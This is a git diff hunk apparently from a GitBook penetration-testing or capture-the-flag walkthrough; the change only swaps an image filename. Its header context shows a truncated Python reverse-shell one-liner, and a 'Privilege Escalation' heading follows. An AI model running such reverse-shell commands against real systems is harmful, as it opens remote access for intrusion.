@@ -73,7 +73,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20) (11).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
